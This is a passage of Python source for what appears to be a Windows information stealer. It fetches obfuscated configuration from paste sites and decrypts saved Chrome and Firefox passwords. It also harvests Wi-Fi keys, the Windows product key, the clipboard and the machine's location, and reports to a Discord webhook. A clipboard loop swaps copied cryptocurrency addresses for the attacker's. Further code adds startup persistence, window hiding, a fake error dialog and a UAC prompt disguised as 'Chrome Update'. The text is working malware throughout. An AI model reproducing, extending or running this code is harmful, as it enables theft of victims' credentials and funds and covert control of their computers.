import asyncio
import sys
import json
import os
import random
import re
import shutil
import sqlite3
import subprocess
import threading
import winreg
import zipfile
import httpx
import psutil
import base64
import requests
import ctypes
import time
import pyperclip
import locale
import win32gui
import win32con
import win32api
import win32process
import cv2


from urllib.parse import urlparse
from configparser import ConfigParser



from tempfile import gettempdir, mkdtemp
from sqlite3 import connect
from base64 import b64decode
from urllib.request import Request, urlopen
from datetime import datetime, timedelta, timezone
from sys import argv
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer, c_char_p, c_int, c_uint32, c_void_p, c_uint
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from subprocess import CREATE_NEW_CONSOLE, Popen, PIPE
from PIL import ImageGrab


myhawkname = "https://rentry.co/on4ev/raw"
thisresp = requests.get(myhawkname)
hwkish = thisresp.text

hwkishst_secret = "https://rentry.co/nxuf8/raw"
thisst = requests.get(hwkishst_secret)
stspecial = thisst.text

wattis_secret = "https://rentry.co/fwi67/raw"
fckyesz = requests.get(wattis_secret)
maybycool = fckyesz.text

shwk_aaast_secret = "https://rentry.co/wnqm9/raw"
grrrrr = requests.get(shwk_aaast_secret)
grbber = grrrrr.text

justalink = "https://rentry.co/ozpmx/raw"
alink = requests.get(justalink)
justafcklink = alink.text


hwkishmyregex_secret = "https://rentry.co/shitonyourAV/raw"
reg_req = requests.get(hwkishmyregex_secret)
regx_net = r"[\w-]{24}\." + reg_req.text

netwrd = "https://rentry.co/fgsqi/raw"
myboyzzz = requests.get(netwrd)
ntwrk = myboyzzz.text


myname_little = myhawkname.lower()
justaterm = base64.b64decode(b'Q29va2llcw==').decode()
justatermlil = justaterm.lower()
coresecretname = base64.b64decode(b'ZGlzY29yZF9kZXNrdG9wX2NvcmU=').decode()
extension_id = f'{base64.b64decode("bmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4=")}'.replace("b'", "").replace("'", "")
inp  = str(extension_id)

imthebestdev = os.getlogin()
spoted_victim = os.getenv("COMPUTERNAME")
space_stored = str(psutil.disk_usage("/")[0] / 1024 ** 3).split(".")[0]
fastmem_stored = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
shell32 = ctypes.windll.shell32
local = os.getenv("LOCALAPPDATA")
roaming = os.getenv("APPDATA")
temp = os.getenv("TEMP")
Notpasswrd = []

json_confg = {
    "created_by": "%PC_CREATOR%",
    "apilink": "%API_LINK%",
    "hooking_hawk": "%_config_4888%",
    "browsers_found": "%_config_2211%",
    "found_av": "%_config_6744%",
    "files_mc": "%_config_6522%",
    "sys_found": "%_config_4454%",
    "roblox_found": "%_config_498%",
    "screen_found": "%_config_777%",
    "ping_config": "%_config_632%",
    "clipboard_found": "%_config_555%",
    "w1f1_found": "%_config_741%",
    "hide_config": "%_config_546%",
    "pingtype_config": "%_config_621%",
    "killdiscord_config": '%_config_45666%',
    "fake_error_config": "%_config_687%",
    "startup_config": "%_config_456%",
    "chromenject_config": "%_config_169%",
    "url_hawkinject": f"https://raw.githubusercontent.com/{hwkish}-{stspecial}/{hwkish}-{justafcklink}",
    "SAEZRTYRES1": '%_config_6511%',
    "AEAZAKG55": "%_config_141%",
    "AEZRETRYY5": "%_config_119%",
    "AEZAZRETG55": "%_config_41%",
    "MPALFLLLL": "%_config_118%",
    "A8666ACLLLL": "%_config_185%",
    "AEZ56TRYY5": "%_config_1222%",
    "LOA444KVDSO": "%_config_55%",
    "MPALAGZBLL": "%_config_45%",
    "MPLAO55599BL": "%_config_89%",
    "LOGZKNNNN": "%_config_101%",
    "AKEOZDSON9N": "%_config_102%",
}


url = f"https://raw.githubusercontent.com/{hwkish}x/testingsomedead/main/nope.json"
response = requests.get(url)

try:
    if response.status_code == 200:
        arrayprgg = response.json()
except:
    arrayprgg = {
"blacklistedprog": [
        "None",
        ]
    }

class Functions(object):
    @staticmethod
    def hwkishfindClipboard():
        return subprocess.run("powershell Get-Clipboard", shell=True, capture_output=True).stdout.decode(errors='backslashreplace').strip()
    
    @staticmethod
    def hwkishfindDevices():
        try:
            command = 'powershell -Command "Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match \'^USB\' }"'
            process = subprocess.run(command, shell=True, capture_output=True, text=True, creationflags=0x08000000)
            if process.returncode == 0:
                return process.stdout
            else:
                print(process.stderr)
            return None
        except:
            pass


    @staticmethod
    def hwkishfindwifi():
        profiles = list()
        passwords = dict()
        for line in subprocess.run('netsh wlan show profile', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().splitlines():
            if 'All User Profile' in line:
                name = line[(line.find(':') + 1):].strip()
                profiles.append(name)

        for profile in profiles:
            found = False
            for line in subprocess.run(f'netsh wlan show profile "{profile}" key=clear', shell=True,capture_output=True).stdout.decode(errors='ignore').strip().splitlines():
                if 'Key Content' in line:
                    passwords[profile] = line[(line.find(':') + 1):].strip()
                    found = True
                    break
            if not found:
                passwords[profile] = '(None)'
        return passwords

    @staticmethod
    def time_convertion(time: int or float) -> str:
        try:
            epoch = datetime(1601, 1, 1, tzinfo=timezone.utc)
            codestamp = epoch + timedelta(microseconds=time)
            return codestamp
        except Exception:
            pass

    @staticmethod
    def mykey_gtm(path: str or os.PathLike) -> str or None:
        try:
            with open(path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            encrypted_key = local_state.get(
                "os_crypt", {}).get("encrypted_key")
            if not encrypted_key:
                return None
            encrypted_key = b64decode(encrypted_key)[5:]
            return Functions.decrypt_windows(encrypted_key)
        except (FileNotFoundError, json.JSONDecodeError, ValueError):
            return None

    @staticmethod
    def files_creating(_dir: str or os.PathLike = gettempdir()):
        f1lenom = "".join( random.SystemRandom().choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") for _ in range(random.randint(10, 20)))
        path = os.path.join(_dir, f1lenom)
        open(path, "x")
        return path

    @staticmethod
    def header_making(token: str = None):
        headers = {
            "Content-Type": "application/json",
        }
        if token:
            headers.update({"Authorization": token})
        return headers

    @staticmethod
    def decrypt_windows(encrypted_str: bytes) -> str:
        return CryptUnprotectData(encrypted_str, None, None, None, 0)[1]

    @staticmethod
    def info_sys() -> list:
        flag = 0x08000000
        sh1 = "wmic csproduct get uuid"
        sh2 = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"
        sh3 = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName"
        try:
            window_wid = (
                subprocess.check_output(sh1, creationflags=flag)
                .decode()
                .split("\n")[1]
                .strip()
            )
        except Exception:
            window_wid = "N/A"
        try:
            windowfoundkey = (
                subprocess.check_output(sh2, creationflags=flag).decode().rstrip())
        except Exception:
            windowfoundkey = "N/A"
        try:
            wind_never = (
                subprocess.check_output(sh3, creationflags=flag).decode().rstrip())
        except Exception:
            wind_never = "N/A"
        return [window_wid, wind_never, windowfoundkey]

    @staticmethod
    def value_decrypt(buff, master_key) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return f'Failed to decrypt "{str(buff)}" | key: "{str(master_key)}"'

    @staticmethod
    def find_in_config(e: str):
        value = json_confg.get(e)
        if value is not None:
            return value
        else: 
            value = arrayprgg.get(e)
            if value is not None:
                return value
                
    @staticmethod
    def info_netword() -> list:
        ip, city, country, region, org, loc, googlemap = (
            "None",
            "None",
            "None",
            "None",
            "None",
            "None",
            "None",
        )
        req = httpx.get("https://ipinfo.io/json")
        if req.status_code == 200:
            data = req.json()
            ip = data.get("ip")
            city = data.get("city")
            country = data.get("country")
            region = data.get("region")
            org = data.get("org")
            loc = data.get("loc")
            googlemap = "https://www.google.com/maps/search/google+map++" + loc
        return [ip, city, country, region, org, loc, googlemap]


class Replacer_Loop(Functions):
    def __init__(self):
        self.btc_finder = self.find_in_config("MPALFLLLL")
        self.addresses = {
            "btc": self.find_in_config("A8666ACLLLL"),
            "eth": self.find_in_config("LOA444KVDSO"),
            "xchain": self.find_in_config("MPALAGZBLL"),
            "pchain": self.find_in_config("MPLAO55599BL"),
            "cchain": self.find_in_config("LOGZKNNNN"),
            "monero": self.find_in_config("AKEOZDSON9N"),
            "ada": self.find_in_config("AEZAZRETG55"),
            "dash": self.find_in_config("AEZ56TRYY5"),
        }

    def copy_address(self, regex, address_key):
        clipboard_data = pyperclip.paste()
        if re.search(regex, clipboard_data):
            if address_key in self.addresses and clipboard_data not in self.addresses.values():
                address = self.addresses[address_key]
                if address != "none":
                    pyperclip.copy(address)

    def address_swap(self):
        self.copy_address("^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$", "btc")
        self.copy_address("^0x[a-fA-F0-9]{40}$", "eth")
        self.copy_address("^([X]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$", "xchain")
        self.copy_address("^([P]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$", "pchain")
        self.copy_address("^([C]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$", "cchain")
        self.copy_address("addr1[a-z0-9]+", "ada")
        self.copy_address("/X[1-9A-HJ-NP-Za-km-z]{33}$/g", "dash")
        self.copy_address("/4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/g", "monero")

    def loop_through(self):
        while True:
            self.address_swap()

    def run(self):
        if self.btc_finder == "yes":
            self.loop_through()

class NotFoundError(Exception):
    pass


class Credentials(object):
    def __init__(self, db):
        self.db = db
        if not os.path.isfile(db):
            raise NotFoundError("ERROR - {0} database not found\n".format(db))
    def __iter__(self):
        pass
    def done(self):
        pass


class SqliteCredentials(Credentials):
    def __init__(self, profile):
        db = os.path.join(profile, "signons.sqlite")
        super(SqliteCredentials, self).__init__(db)
        self.conn = sqlite3.connect(db)
        self.c = self.conn.cursor()

    def __iter__(self):
        self.c.execute("SELECT hostname, encryptedUsername, encryptedPassword, encType "
                       "FROM moz_logins")
        for i in self.c:
            yield i

    def done(self):
        super(SqliteCredentials, self).done()
        self.c.close()
        self.conn.close()


class JsonCredentials(Credentials):
    def __init__(self, profile):
        db = os.path.join(profile, "logins.json")
        super(JsonCredentials, self).__init__(db)

    def __iter__(self):
        with open(self.db) as fh:
            data = json.load(fh)
            try:
                logins = data["logins"]
            except:
                raise Exception("Unrecognized format in {0}".format(self.db))
            for i in logins:
                yield (i["hostname"], i["encryptedUsername"],
                       i["encryptedPassword"], i["encType"])


class NSSDecoder(object):
    class SECItem(ctypes.Structure):
        _fields_ = [
            ('type', c_uint),
            ('data', c_char_p),
            ('len', c_uint),
        ]

    class PK11SlotInfo(ctypes.Structure):
        ...

    def __init__(self):
        try:
            self.NSS = None
            self.load_libnss()
            SlotInfoPtr = ctypes.POINTER(self.PK11SlotInfo)
            SECItemPtr = ctypes.POINTER(self.SECItem)
            self._set_ctypes(c_int, "NSS_Init", c_char_p)
            self._set_ctypes(c_int, "NSS_Shutdown")
            self._set_ctypes(SlotInfoPtr, "PK11_GetInternalKeySlot")
            self._set_ctypes(None, "PK11_FreeSlot", SlotInfoPtr)
            self._set_ctypes(c_int, "PK11_CheckUserPassword", SlotInfoPtr, c_char_p)
            self._set_ctypes(c_int, "PK11SDR_Decrypt", SECItemPtr, SECItemPtr, c_void_p)
            self._set_ctypes(None, "SECITEM_ZfreeItem", SECItemPtr, c_int)
            self._set_ctypes(c_int, "PORT_GetError")
            self._set_ctypes(c_char_p, "PR_ErrorToName", c_int)
            self._set_ctypes(c_char_p, "PR_ErrorToString", c_int, c_uint32)
        except:
            pass

    def _set_ctypes(self, restype, name, *argtypes):
        try:
            res = getattr(self.NSS, name)
            res.restype = restype
            res.argtypes = argtypes
            setattr(self, "_" + name, res)
        except:
            pass


    @staticmethod
    def find_nss(locations, nssname):
        try:
            for loc in locations:
                if os.path.exists(os.path.join(loc, nssname)):
                    return loc
            return ""
        except:
            pass


    def load_libnss(self):
        try:
            if os.name == "nt":
                nssname = "nss3.dll"
                locations = (
                    "", 
                    r"C:\Program Files (x86)\Mozilla Firefox",
                    r"C:\Program Files\Mozilla Firefox"
                )
                firefox = self.find_nss(locations, nssname)
                if firefox:
                    os.environ["PATH"] = ';'.join([os.environ["PATH"], firefox])
            elif os.uname()[0] == "Darwin":
                nssname = "libnss3.dylib"
                locations = (
                    "",  
                    "/usr/local/lib/nss",
                    "/usr/local/lib",
                    "/opt/local/lib/nss",
                    "/sw/lib/firefox",
                    "/sw/lib/mozilla",
                    "/usr/local/opt/nss/lib", 
                    "/opt/pkg/lib/nss",
                )
                firefox = self.find_nss(locations, nssname)
            else:
                nssname = "libnss3.so"
                firefox = ""
            try:
                if firefox:
                    nsslib = os.path.join(firefox, nssname)
                    self.NSS = ctypes.CDLL(nsslib)
            except Exception as e:
                pass
        except:
            pass



    def handle_error(self):
        try:
            code = self._PORT_GetError()
            name = self._PR_ErrorToName(code)
            name = "NULL" if name is None else name.decode("ascii")
            text = self._PR_ErrorToString(code, 0)
            text = text.decode("utf8")
        except:
            pass


    def decode(self, data64):
        try:
            data = b64decode(data64)
            inp = self.SECItem(0, data, len(data))
            out = self.SECItem(0, None, 0)
            e = self._PK11SDR_Decrypt(inp, out, None)
            try:
                if e == -1:
                    pass
                res = ctypes.string_at(out.data, out.len).decode("utf8")
            finally:
                self._SECITEM_ZfreeItem(out, 0)
            return res
        except:
            pass





class hwkish_first_funct(Functions):
    def __init__(self):
        
        self.profile = None
        self.NSS = NSSDecoder()

        self.firefox_installed = False

        self.eco_baby = f'{base64.b64decode(self.find_in_config("hooking_hawk"))}'.replace("b'", "").replace("'", "")
        self.ecobybro = str(self.eco_baby)

        self.thingstocount = {
            f'{justatermlil}': 0,
            'passwrd': 0,
            'screenshotbro': 0,
            'creditcard': 0,
            'historybaby': 0,
            'bookmarksbaby':0,
            'info_discord': 0,
            'roblox_friendly': 0,
            'friendlybabymc': 0,
            'wifinet': 0
        }
        self.ccounter ={
    "mail": 0,
    "[gmail](https://gmail.com)": 0,
    "[sellix](https://sellix.io)": 0,
    "[steam](https://steam.com)": 0,
    "[discord](https://discord.com)": 0,
    "[riotgames](https://riotgames.com)": 0,
    "[youtube](https://youtube.com)": 0,
    "[instagram](https://instagram.com)": 0,
    "[tiktok](https://tiktok.com)": 0,
    "[twitter](https://twitter.com)": 0,
    "[facebook](https://facebook.com)": 0,
    "card": 0,
    "[epicgames](https://epicgames.com)": 0,
    "[spotify](https://spotify.com)": 0,
    "[yahoo](https://yahoo.com)": 0,
    "[roblox](https://roblox.com)": 0,
    "[twitch](https://twitch.com)": 0,
    "[minecraft](https://minecraft.net)": 0,
    "bank": 0,
    "[paypal](https://paypal.com)": 0,
    "[origin](https://origin.com)": 0,
    "[amazon](https://amazon.com)": 0,
    "[ebay](https://ebay.com)": 0,
    "[aliexpress](https://aliexpress.com)": 0,
    "[playstation](https://playstation.com)": 0,
    "[hbo](https://hbo.com)": 0,
    "[xbox](https://xbox.com)": 0,
    "buy": 0,
    "sell": 0,
    "[binance](https://binance.com)": 0,
    "[hotmail](https://hotmail.com)": 0,
    "[outlook](https://outlook.com)": 0,
    "[crunchyroll](https://crunchyroll.com)": 0,
    "[telegram](https://telegram.com)": 0,
    "[pornhub](https://pornhub.com)": 0,
    "[disney](https://disney.com)": 0,
    "[expressvpn](https://expressvpn.com)": 0,
    "crypto": 0,
    "[uber](https://uber.com)": 0,
    "[netflix](https://netflix.com)": 0,
        }

        self.thishawk_webh = self.ecobybro

        self.apilink = self.find_in_config("apilink")
        
        self.created_by = self.find_in_config("created_by")

        self.gangman = str(self.created_by)

        self.str_creator_ = self.gangman

        self.hide = self.find_in_config("hide_config")

        self.disablemydefender = self.find_in_config("AEAZAKG55")

        self.pingtype = self.find_in_config("pingtype_config")

        self.pingonrun = self.find_in_config("ping_config")

        self.disc_url_api = "https://discord.com/api/v9/users/@me"

        self.startupexe = self.find_in_config("startup_config")

        self.fake_error = self.find_in_config("fake_error_config")

        self.hwk_get_browsers = self.find_in_config("browsers_found")

        self.hwk_get_av = self.find_in_config("found_av")

        self.hwk_get_mc = self.find_in_config("files_mc")

        self.hwk_get_sys = self.find_in_config("sys_found")

        self.hwk_get_rblx = self.find_in_config("roblox_found")

        self.hwk_get_screen = self.find_in_config("screen_found")

        self.hwk_get_clipboard = self.find_in_config("clipboard_found")

        self.hwk_get_wifipassword = self.find_in_config("w1f1_found")

        self.appdata = local

        self.roaming = roaming
        self._1 = "Google"

        self.chrome_user_path = os.path.join(self.appdata, self._1, "Chrome", maybycool)

        self.dir, self.temp = mkdtemp(), gettempdir()

        inf, net = self.info_sys(), self.info_netword()

        self.total, self.used, self.free = shutil.disk_usage("/")

        self.pc_codewinl = locale.getdefaultlocale()[0]
        self.fastmem_stored = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]

        self.total_gb = self.total / (2**30)
        self.used_gb = self.used / (2**30)
        self.free_gb = self.free / (2**30)

        self.used_percent = self.used / self.total * 100

        self.progress_bar_length = 20
        self.num_filled_blocks = int(
            self.used_percent / 100 * self.progress_bar_length)
        self.progress_bar = "[" + "█" * self.num_filled_blocks + "." * \
            (self.progress_bar_length - self.num_filled_blocks) + "]"

        self.window_wid, self.never_wind, self.windowfoundkey = (
            inf[0],
            inf[1],
            inf[2],
        )

        (
            self.ip,
            self.city,
            self.country,
            self.region,
            self.org,
            self.loc,
            self.googlemap,
        ) = (net[0], net[1], net[2], net[3], net[4], net[5], net[6])

        self.localstartup = os.path.join(self.roaming, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

        self.webapi_find = "api/webhooks"

        self.chrmrgx = re.compile(r"(^profile\s\d*)|default|(guest profile$)", re.IGNORECASE | re.MULTILINE)

        self.disc_url_api = "https://discord.com/api/v9/users/@me"

        self.regex = regx_net

        self.regexcrypt = r"dQw4w9WgXcQ:[^\"]*"

        self.hawked = []

        self.hwkishid = []

        self.sep = os.sep

        self.rblxcckcs = []

        self.thezip_url = ""

        self.chrome_key = self.mykey_gtm(
            os.path.join(self.chrome_user_path, "Local State"))

        os.makedirs(self.dir, exist_ok=True)    

        #EXTENSIONS INJECTOR
        self.programdata = os.environ['ProgramData']

        self.operagx = False
        self.opera = False
        self.brave = False
        self.chrome = False
        self.vivaldi = False
        self.edge = False
        self.yandex = False
        self.iron = False
        self.kiwi = False
        self.torch = False
        self.slimjet = False
        self.dragon = False
        self.operaneon = False

        self.browser_processes = {
                'chrome': 'chrome.exe',
                'opera': 'opera.exe',
                'opera_gx': 'opera_gx.exe',
                'brave': 'brave.exe',
                'vivaldi': 'vivaldi.exe',
                'edge': 'msedge.exe',
                'yandex': 'browser.exe',
                'iron': 'iron.exe',
                'kiwi': 'kiwi.exe',
                'torch' : 'torch.exe',
                'slimjet': 'slimjet.exe',
                'dragon': 'dragon.exe',
                'opera_neon': 'opera_neon.exe'
            }

        self.path_shortcutnav_roaming = {
            "Google Chrome": f"{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Google Chrome.lnk",
            "Opera": f"{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Opera.lnk",
            "Opera GX": f"{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Opera GX.lnk",
            "Brave": f"{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Brave.lnk",
            "Vivaldi": f"{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Vivaldi.lnk",
            "Microsoft Edge": f"{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Microsoft Edge.lnk",
            "Yandex Browser": f"{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Yandex\\Yandex Browser.lnk",
            "SRWare Iron": f"{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\SRWare Iron.lnk",
            "Kiwi Browser": f"{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Kiwi Browser.lnk",
            "Torch Browser": f"{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Torch Browser.lnk",
            "Slimjet": f"{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Slimjet.lnk",
            "Comodo Dragon": f"{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Comodo Dragon.lnk",
            "Opera Neon": f"{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Opera Neon.lnk"
        }
        self.path_shortcutnav_programdata = {
            "Google Chrome": f"{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Google Chrome.lnk",
            "Opera": f"{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Opera.lnk",
            "Opera GX": f"{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Opera GX.lnk",
            "Brave": f"{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Brave.lnk",
            "Vivaldi": f"{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Vivaldi.lnk",
            "Microsoft Edge": f"{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Microsoft Edge.lnk",
            "Yandex Browser": f"{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Yandex\\Yandex Browser.lnk",
            "SRWare Iron": f"{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\SRWare Iron.lnk",
            "Kiwi Browser": f"{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Kiwi Browser.lnk",
            "Torch Browser": f"{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Torch Browser.lnk",
            "Slimjet": f"{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Slimjet.lnk",
            "Comodo Dragon": f"{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Comodo Dragon.lnk",
            "Opera Neon": f"{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Opera Neon.lnk"
        }
        self.path_shortcutnav_additionnal = {
            "Opera GX": f"{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Navigateur Opera GX.lnk",
        }


    def askadmin(self):
        if self.find_in_config("chromenject_config") != "yes":
            return
        if shell32.IsUserAnAdmin() == 0:
            if shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1, 'Chrome Update') <= 32:
                   raise Exception("Error permissions")
            time.sleep(1)
            if self.hide == "yes":
                hide = win32gui.GetForegroundWindow()
                win32gui.ShowWindow(hide, win32con.SW_HIDE)
        

    def remoter_hwkisherr(self: str) -> str:
        if self.fake_error != "yes":
            return
        ctypes.windll.user32.MessageBoxW(None,
            "Error code: Windows_0x786542\nSOmething gone wrong.",
            "Fatal Error",
            0,
        )

    def ping_on_running(self: str) -> str:
        if self.pingonrun != "yes":
            return
        ping1 = {
            "username": f"{hwkish} - {grbber}",
            "avatar_url": f"https://raw.githubusercontent.com/{hwkish}x/assets/main/hawkish.png",
            "content": "@everyone",
        }
        ping2 = {
            "username": f"{hwkish} - {grbber}",
            "avatar_url": f"https://raw.githubusercontent.com/{hwkish}x/assets/main/hawkish.png",
            "content": "@here",
        }
        if self.webapi_find in self.thishawk_webh:
            if self.pingtype in ["@everyone", "everyone"]:
                httpx.post(self.thishawk_webh, json=ping1)
            elif self.pingtype in ["@here", "here"]:
                httpx.post(self.thishawk_webh, json=ping2)

    def startup_so(self: str) -> str:
        if self.startupexe != "yes":
            return
        startup_path = os.path.join(roaming, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        src_file = argv[0]
        dest_file = os.path.join(startup_path, os.path.basename(src_file))
        if os.path.exists(dest_file):
            os.remove(dest_file)
        shutil.copy2(src_file, dest_file)

    def hide_so(self):
        if self.hide != "yes":
            return
        hwnd = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
        current_pid = win32api.GetCurrentProcessId()
        current_process_handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, current_pid)
        if current_process_handle:
            try:
                win32process.SetPriorityClass(current_process_handle, win32process.BELOW_NORMAL_PRIORITY_CLASS)
            except:
                pass

    def hwkishexit_this(self):
        shutil.rmtree(self.dir, ignore_errors=True)
        os._exit(0)

    def extract_try(func):
        def wrapper(*args, **kwargs):
            try:
                func(*args, **kwargs)
            except Exception:
                pass
        return wrapper

    def getlange(self, pc_code) -> str:
        try:
            lang_map = {
                "fr_FR": "FR_",
                "ar_SA": "AR_",
                "bg_BG": "BU_",
                "ca_ES": "CA_",
                "zh_TW": "CH_",
                "cs_CZ": "CZ_",
                "da_DK": "DA_",
                "de_DE": "GE_",
                "el_GR": "GR_",
                "en_US": "US_",
                "es_ES": "SP_",
                "fi_FI": "FIN_",
                "he_IL": "HEB_",
                "hu_HU": "HUN_",
                "is_IS": "ICE_",
                "it_IT": "IT_",
                "ko_KR": "KO_",
                "nl_NL": "DU_",
                "nb_NO": "NORW_",
                "pl_PL": "POL_",
                "pt_BR": "BR_",
                "rm_CH": "RH_RO_",
                "ro_RO": "ROM_",
                "ru_RU": "RU_",
                "hr_HR": "CRO_",
                "sk_SK": "SLOV_",
                "sq_AL": "ALB_",
                "sv_SE": "SWE_",
                "tr_TR": "TURK_",
                "ur_PK": "UR_PAK_",
                "id_ID": "IND_",
                "uk_UA": "UKR_",
                "be_BY": "BELA_RU_",
                "sl_SI": "SLOVE_",
                "et_EE": "EST_",
                "lv_LV": "LATV_",
                "lt_LT": "LITH_",
                "tg_Cyrl_TJ": "TAJIK_",
                "fa_IR": "PERS_",
                "vi_VN": "VIET_",
                "hy_AM": "ARM_",
                "az_Latn_AZ": "AZERI_",
                "eu_ES": "BASQUE_",
                "wen_DE": "SORB_",
                "mk_MK": "MACE_",
                "st_ZA": "SUTU_",
                "ts_ZA": "TSO_",
                "tn_ZA": "TSA_",
                "ven_ZA": "VEND_",
                "xh_ZA": "XH_",
                "zu_ZA": "ZU_",
                "af_ZA": "AFR_",
                "ka_GE": "GEO_",
                "fo_FO": "FARO_",
                "hi_IN": "HINDI_",
                "mt_MT": "MAL_",
                "se_NO": "SAMI_",
                "gd_GB": "GAELIC_",
                "yi": "YI_",
                "ms_MY": "MALAY_",
                "kk_KZ": "KAZAKH_",
                "ky_KG": "CYR_",
                "bs_Latn_BA": "BOSNIAN_",
                "sr_Cyrl_RS": "SERB_",
                "sr_Latn_RS": "SERBLAT_",
                "bs_BA": "BOS_",
                "iu_Cans_CA": "IUK_",
                "sk_SK": "SLOV_",
                "en_US": "EN_",
                "am_ET": "AMH_",
                "tmz": "TMZ_",
                "ks_Arab_IN": "KSH_",
                "ne_NP": "NEP_",
                "fy_NL": "FRS_",
                "ps_AF": "PAS_",
                "fil_PH": "FIL_",
                "dv_MV": "DIV_",
                "bin_NG": "BEN_",
                "fuv_NG": "FUL_",
                "ha_Latn_NG": "HAU_",
                "ibb_NG": "IBO_",
                "yo_NG": "YOR_",
                "quz_BO": "QUB_",
                "nso_ZA": "NSO_",
                "ig_NG": "IBO_",
                "kr_NG": "KAN_",
                "gaz_ET": "ORO_",
                "ti_ER": "TIR_",
                "gn_PY": "GRN_",
                "haw_US": "HAW_",
                "la": "LAT_",
                "so_SO": "SOM_",
                "ii_CN": "III_",
                "pap_AN": "PAP_",
                "ug_Arab_CN": "UIG_",
                "mi_NZ": "MRI_",
                "ar_IQ": "ARA_",
                "zh_CN": "ZHO_",
                "de_CH": "DEU_",
                "es_MX": "SPA_",
                "fr_BE": "FRA_",
                "it_CH": "ITA_",
                "nl_BE": "NLD_",
                "nn_NO": "NNO_",
                "pt_PT": "POR_",
                "ro_MD": "RON_",
                "ru_MD": "RUS_",
                "sr_Latn_CS": "SRP_",
                "sv_FI": "SVE_",
                "ur_IN": "URD_",
                "az_Cyrl_AZ": "AZE_",
                "ga_IE": "GLE_",
                "ms_BN": "MAL_",
                "uz_Cyrl_UZ": "UZB_",
                "bn_BD": "BEN_",
                "pa_PK": "PAN_",
                "mn_Mong_CN": "MON_",
                "bo_BT": "BOD_",
                "sd_PK": "SND_",
                "tzm_Latn_DZ": "TZN_",
                "ks_Deva_IN": "KSH_",
                "ne_IN": "NEP_",
                "quz_EC": "QUE_",
                "ti_ET": "TIR_",
                "ar_EG": "ARA_",
                "zh_HK": "ZHO_",
                "de_AT": "DEU_",
                "en_AU": "ENG_",
                "fr_CA": "FRE_",
                "sr_Cyrl_CS": "SRB_",
                "quz_PE": "QUE_",
                "ar_LY": "ARA_",
                "zh_SG": "CHN_",
                "de_LU": "GER_",
                "en_CA": "ENG_",
                "es_GT": "SPA_",
                "fr_CH": "FRE_",
                "hr_BA": "HRV_",
                "ar_DZ": "ARA_",
                "zh_MO": "CHN_",
                "de_LI": "GER_",
                "th_TH": "TH_",
                "en_GB": "EN_",
                "ja_JP": "JAP_"
            }
            return lang_map.get(pc_code, "KS_")
        except:
            return "KS_"

    async def init(self):
        self.browsers = {
            "amigo": self.appdata + "\\Amigo\\User Data",
            "torch": self.appdata + "\\Torch\\User Data",
            "kometa": self.appdata + "\\Kometa\\User Data",
            "orbitum": self.appdata + "\\Orbitum\\User Data",
            "cent-browser": self.appdata + "\\CentBrowser\\User Data",
            "7star": self.appdata + "\\7Star\\7Star\\User Data",
            "sputnik": self.appdata + "\\Sputnik\\Sputnik\\User Data",
            "vivaldi": self.appdata + "\\Vivaldi\\User Data",
            "google-chrome-sxs": self.appdata + "\\Google\\Chrome SxS\\User Data",
